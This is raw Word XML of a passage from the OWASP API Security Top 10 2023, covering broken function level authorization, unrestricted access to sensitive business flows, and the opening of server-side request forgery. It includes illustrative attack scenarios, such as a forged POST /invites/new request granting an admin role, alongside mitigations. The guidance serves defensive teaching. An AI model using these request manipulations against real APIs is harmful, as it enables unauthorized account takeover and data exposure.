        <w:t>)?</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Don't assume that an API endpoint is regular or administrative only based on the URL path.</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While developers might choose to expose most of the administrative endpoints under a specific relative path, like </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/</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/admins</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>, it's very common to find these administrative endpoints under other relative paths together with regular endpoints, like </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/</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/users</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E3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DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E36"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During the registration process for an application that allows only invited users to join, the mobile application triggers an API call to </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>GET /</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/invites</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>invite_guid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>. The response contains a JSON with details about the invite, including the user's role and the user's email.</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lastRenderedPageBreak/>
        <w:t>An attacker duplicates the request and manipulates the HTTP method and endpoint to </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>POST /</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/invites/new</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>. This endpoint should only be accessed by administrators using the admin console. The endpoint does not implement function level authorization checks.</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attacker exploits the issue and sends a new invite with admin privileges:</w:t>
      </w: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POST /</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/invites/new</w:t>
      </w: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roofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>email</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": "attacker@somehost.com",</w:t>
      </w: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 xml:space="preserve">  "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>role</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":"admin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E36" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>}</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Later on, the attacker uses the maliciously crafted invite in order to create themselves an admin account and gain full access to the system.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E36"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contains an endpoint that should be exposed only to administrators - </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>GET /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>api</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/admin/v1/users/all</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>. This endpoint returns the details of all the users of the application and does not implement function level authorization checks. An attacker who learned the API structure takes an educated guess and manages to access this endpoint, which exposes sensitive details of the users of the application.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E36"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DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E36"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Your application should have a consistent and easy-to-analyze authorization module that is invoked from all your business functions. Frequently, such protection is provided by one or more components external to the application code.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E36" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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enforcement mechanism(s) should deny all access by default, requiring explicit grants to specific roles for access to every function.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E36" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Review your API endpoints against function level authorization flaws, while keeping in mind the business logic of the application and </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>groups</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> hierarchy.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E36" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Make sure that all of your administrative controllers inherit from an administrative abstract controller that implements authorization checks based on the user's group/role.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E36" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>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Make sure that administrative functions inside a regular controller implement authorization checks based on the user's group and role.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E36" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4"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API6:2023 Unrestricted Access to Sensitive Business Flows</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450"/>
        <w:gridCol w:w="4787"/>
        <w:gridCol w:w="3883"/>
      </w:tblGrid>
      <w:tr w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidTr="00271AF4">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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lastRenderedPageBreak/>
              <w:t>Threat agents/Attack vectors</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271AF4" w:rsidRPr="00790A44" w:rsidTr="00271AF4">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Widespread</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Average</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Moderate</w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t> : Business Specific</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidTr="00271AF4">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Exploitation usually involves understanding the business model backed by the API, finding sensitive business flows, and automating access to these flows, causing harm to the business.</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Lack of a holistic view of the API in order to fully support business requirements tends to contribute to the prevalence of this issue. Attackers manually identify what resources (e.g. endpoints) are involved in the target workflow and how they work together. If mitigation mechanisms are already in place, attackers need to find a way to bypass them.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcMar>
              <w:top w:w="225" w:type="dxa"/>
              <w:left w:w="300" w:type="dxa"/>
              <w:bottom w:w="225" w:type="dxa"/>
              <w:right w:w="300" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4" w:rsidP="00AD3BE1">
            <w:pPr>
              <w:jc w:val="lowKashida"/>
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>In general technical impact is not expected. Exploitation might hurt the business in different ways, for example: prevent legitimate users from purchasing a product, or lead to inflation in the internal economy of a game.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF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Is the API Vulnerable?</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When creating an API Endpoint, it is important to understand which business flow it exposes. Some business flows are more sensitive than others, in the sense that excessive access to them may harm the business.</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Common examples of sensitive business flows and risk of excessive access associated with them:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>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Purchasing a product flow - an attacker can buy all the stock of a high-demand item at once and resell for a higher price (scalping)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>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Creating a comment/post flow - an attacker can spam the system</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>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Making a reservation - an attacker can reserve all the available time slots and prevent other users from using the system</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risk of excessive access might change between industries and businesses. For example - creation of posts by a script might be considered as a risk of spam by one social network, but encouraged by another social network.</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Endpoint is vulnerable if it exposes a sensitive business flow, without appropriately restricting the access to it.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF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Example Attack Scenarios</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4"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technology company announces they are going to release a new gaming console on Thanksgiving. The product has a very high demand and the stock is limited. An attacker writes code to automatically buy the new product and complete the transaction.</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On the release day, the attacker runs the code distributed across different IP addresses and locations. The API doesn't implement the appropriate protection and allows the attacker to buy the majority of the stock before other legitimate users.</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Later on, the attacker sells the product on another platform for a much higher price.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4"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airline company offers online ticket purchasing with no cancellation fee. A user with malicious intentions books 90% of the seats of a desired flight.</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few days before the flight the malicious user canceled all the tickets at once, which forced the airline to discount the ticket prices in order to fill the flight.</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At this point, the user buys herself a single ticket that is much cheaper than the original one.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4"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#3</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ride-sharing app provides a referral program - users can invite their friends and gain credit for each friend who has joined the app. This credit can be later used as cash to book rides.</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attacker exploits this flow by writing a script to automate the registration process, with each new user adding credit to the attacker's wallet.</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attacker can later enjoy free rides or sell the accounts with excessive credits for cash.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF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271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF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mitigation planning should be done in two layers:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>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Business - identify the business flows that might harm the business if they are excessively used.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="120" w:beforeAutospacing="0" w:after="120" w:afterAutospacing="0"/>
        <w:ind w:left="450"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>Engineering - choose the right protection mechanisms to mitigate the business risk.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="120" w:beforeAutospacing="0" w:after="120" w:afterAutospacing="0"/>
        <w:ind w:left="450"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve">Some of the protection mechanisms are </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>more simple</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> while others are more difficult to implement. The following methods are used to slow down automated threats:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="13"/>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lastRenderedPageBreak/>
        <w:t>Device fingerprinting: denying service to unexpected client devices (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> headless browsers) tends to make threat actors use more sophisticated solutions, thus more costly for them</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="13"/>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Human detection: using either captcha or more advanced biometric solutions (e.g. typing patterns)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="13"/>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Non-human patterns: analyze the user flow to detect non-human patterns (e.g. the user accessed the "add to cart" and "complete purchase" functions in less than one second)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="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Consider blocking IP addresses of Tor exit nodes and well-known proxies</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="120" w:beforeAutospacing="0" w:after="120" w:afterAutospacing="0"/>
        <w:ind w:left="450"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>Secure and limit access to APIs that are consumed directly by machines (such as developer and B2B APIs). They tend to be an easy target for attackers because they often don't implement all the required protection mechanisms.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9"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API7:2023 Server Side Request Forgery</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881"/>
        <w:gridCol w:w="4294"/>
        <w:gridCol w:w="3945"/>
      </w:tblGrid>
      <w:tr w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidTr="008E1AF9">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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8E1AF9" w:rsidRPr="00790A44" w:rsidTr="008E1AF9">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Common</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Moderate</w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t> : Business Specific</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidTr="008E1AF9">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Exploitation requires the attacker to find an API endpoint that accesses a URI that’s provided by the client. In general, basic SSRF (when the response is returned to the attacker), is easier to exploit than Blind SSRF in which the attacker has no feedback on whether or not the attack was successful.</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Modern concepts in application development encourage developers to access URIs provided by the client. Lack of or improper validation of such URIs are common issues. Regular API requests and response analysis will be required to detect the issue. When the response is not returned (Blind SSRF) detecting the vulnerability requires more effort and creativity.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcMar>
              <w:top w:w="225" w:type="dxa"/>
              <w:left w:w="300" w:type="dxa"/>
              <w:bottom w:w="225" w:type="dxa"/>
              <w:right w:w="300" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9"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Successful exploitation might lead to internal services enumeration (e.g. port scanning), information disclosure, bypassing firewalls, or other security mechanisms. In some cases, it can lead to </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>DoS</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> or the server being used as a proxy to hide malicious activities.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9"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Is the API Vulnerable?</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Server-Side Request Forgery (SSRF) flaws occur when an API is fetching a remote resource without validating the user-supplied URL. It enables an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall or a VPN.</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Modern concepts in application development make SSRF more common and more dangerous.</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lastRenderedPageBreak/>
        <w:t xml:space="preserve">More common - the following concepts encourage developers to access an external resource based on user input: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>Webhooks</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>, file fetching from URLs, custom SSO, and URL previews.</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More dangerous - Modern technologies like cloud providers, Kubernetes, and Docker expose management and control channels over HTTP on predictable, well-known paths. Those channels are an easy target for an SSRF attack.</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It is also more challenging to limit outbound traffic from your application, because of the connected nature of modern applications.</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The SSRF risk </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>can not</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> always be completely eliminated. While choosing a protection mechanism, it is important to consider the business risks and needs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9"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8E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9"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social network allows users to upload profile pictures. The user can choose either to upload the image file from their machine, or provide the URL of the image. Choosing the second, will trigger the following API call:</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api</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
